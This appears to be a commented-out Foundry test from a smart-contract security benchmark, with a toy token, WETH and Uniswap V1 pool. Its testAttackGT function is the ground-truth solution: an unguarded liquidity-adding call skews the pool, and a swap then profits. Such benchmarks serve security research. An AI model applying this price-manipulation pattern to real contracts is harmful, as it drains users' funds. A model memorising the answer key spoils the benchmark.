// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";

// import "@utils/WETH.sol";
// import "@utils/UniswapV1.sol";

// import "benchmarks/toy/LiquidityAdder/TokenA.sol";
// import "benchmarks/toy/LiquidityAdder/TokenADeployer.sol";

// contract LiquidityAdderTest is Test {
//     address owner;
//     address attacker;

//     TokenA token;
//     WETH weth;
//     UniswapV1 uniswap;

//     TokenADeployer deployer;

//     uint256 constant totalSupply = 1000 ether;
//     uint256 constant feeRate = 15;

//     uint256 constant deployerInitBalance = 900 ether;
//     uint256 constant deployerInitToken = 900 ether;

//     uint256 constant uniswapInitBalance = 10 ether;
//     uint256 constant uniswapInitToken = 10 ether;

//     uint256 constant attackerInitBalance = 0 ether;
//     uint256 constant attackerInitToken = 1 ether;

//     uint256 constant requiredBalance = attackerInitToken * 2;

//     function setUp() public {
//         owner = address(0xdeadbeef);
//         attacker = address(this);

//         vm.startPrank(owner);
//         token = new TokenA(totalSupply);
//         weth = new WETH(totalSupply);

//         uniswap = new UniswapV1(address(token), address(weth), feeRate);
//         token.transfer(address(uniswap), uniswapInitToken);
//         weth.transfer(address(uniswap), uniswapInitBalance);

//         deployer = new TokenADeployer(address(token), address(weth), address(uniswap));
//         token.transfer(address(deployer), deployerInitToken);
//         weth.transfer(address(deployer), deployerInitBalance);

//         token.transfer(attacker, attackerInitToken);
//         weth.transfer(attacker, attackerInitBalance);
//         vm.stopPrank();
//     }

//     function testAttackGT() public {
//         token.approve(address(uniswap), UINT256_MAX);
//         deployer.addLiquidityToPool(0, deployerInitBalance);
//         uniswap.swapTokenToWETH(token.balanceOf(attacker));
//         require(attackGoal(), "Attack Failed!");
//     }

//     function attackGoal() public view returns (bool) {
//         return weth.balanceOf(attacker) >= requiredBalance;
//     }

//     // function invariantSafe() public view {
//     //     assert(!attackGoal());
//     // }
// }
